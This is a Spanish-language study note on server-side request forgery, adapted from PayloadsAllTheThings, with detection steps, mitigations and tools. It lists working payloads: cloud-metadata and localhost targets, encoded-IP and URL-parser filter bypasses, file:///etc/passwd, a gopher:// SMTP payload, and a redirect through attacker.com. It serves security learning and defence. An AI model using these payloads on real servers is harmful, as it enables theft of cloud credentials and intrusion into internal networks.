---
tags:
  - seguridad-web
  - owasp
  - ssrf
aliases:
  - SSRF
  - Server-Side Request Forgery
---

# SSRF (Server-Side Request Forgery)

**El Server-Side Request Forgery (SSRF)** es una vulnerabilidad en la que un atacante fuerza al servidor a realizar peticiones HTTP (u otros protocolos) en su nombre, hacia destinos que el atacante elige.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Ocurre cuando el servidor procesa una URL o dirección IP proporcionada por el usuario sin validarla y la utiliza para hacer una petición. Como la petición sale **desde el servidor**, el atacante alcanza recursos que normalmente no vería desde fuera. Caminos de explotación habituales:

- Acceso a **metadata de la nube** (AWS/GCP/Azure) para robar credenciales.
- Lectura de ficheros locales (`file://`).
- Descubrimiento de red y escaneo de puertos internos.
- Envío de paquetes a servicios internos (Redis, Memcached, etc.), a menudo para lograr RCE.

```py
url = input("Enter URL:")        # entrada del usuario sin validar
response = requests.get(url)     # el servidor hace la petición
```

## Detección y pruebas
- Identifica parámetros que reciben URLs, IPs o nombres de host (webhooks, importadores, generadores de PDF/miniaturas, proxies, validadores).
- Apunta a tu propio servidor (Burp Collaborator / OAST) para confirmar SSRF, incluso a ciegas, observando la conexión entrante.
- Prueba `localhost`/`127.0.0.1` y el endpoint de metadata cloud para medir el alcance.
- Herramientas: **SSRFmap**, **See-SURF**, **surf**, **SSRF-Sheriff**.

## Explotación / payloads

**Destinos por defecto (servicios internos y metadata cloud):**

```http
http://localhost:80
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/
```

**Bypass de filtros — IPv6 y direcciones raras:**

```http
http://[::]:80/
http://[::ffff:127.0.0.1]
http://0/
http://127.1
```

**Bypass de filtros — IP codificada (decimal, octal, hex):**

```http
http://2130706433/        # = 127.0.0.1
http://2852039166/        # = 169.254.169.254
http://0177.0.0.1/        # octal = 127.0.0.1
http://0x7f000001         # hex   = 127.0.0.1
```

**Bypass — dominios que resuelven a interno y redirecciones:**

```http
http://localtest.me/          # -> ::1
http://127.0.0.1.nip.io/      # -> 127.0.0.1
http://vulnerable.com/?url=http://attacker.com/redir   # 307/308 conservan método y body
```

**Bypass — discrepancia del parser de URL** (distintas librerías eligen distinto host):

```http
http://127.1.1.1:80\@10.0.0.1:80/
http://127.1.1.1:80#\@10.0.0.1:80/
http:127.0.0.1/
```

**Esquemas de URL para escalar el impacto:**

```http
file:///etc/passwd
dict://10.0.0.1:11211/
gopher://10.0.0.1:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

> `gopher://` permite enviar datos arbitrarios sobre TCP, lo que habilita explotar Redis, Memcached o SMTP internos (a menudo a ciegas).

## Mitigación
- **Allowlist de destinos** permitidos (dominios/IPs/puertos/esquemas) en lugar de blocklists, que son fáciles de evadir.
- **Bloquear rangos internos y de loopback**: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` y equivalentes IPv6.
- Resolver el host **y validar la IP resultante** antes de conectar, repitiendo la comprobación tras los redirects (mitiga DNS rebinding y open redirect). Idealmente, deshabilitar redirecciones.
- Permitir solo `http`/`https`; rechazar `file`, `gopher`, `dict`, `ftp`, etc.
- Proteger los endpoints de metadata cloud (IMDSv2 en AWS) y aplicar segmentación de red / egress filtering.

## Herramientas
- **SSRFmap** — fuzzer y explotación automática de SSRF.
- **Gopherus** — genera payloads `gopher://` para RCE en servicios internos.
- **See-SURF**, **surf** — descubrimiento de parámetros candidatos.
- **ipfuscator** — genera representaciones alternativas de IPv4.

---
🔗 Relacionado: [[XSS (Cross-Site Scripting)]] · [[CSRF (Cross-Site Request Forgery)]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) (MIT, © Swissky)
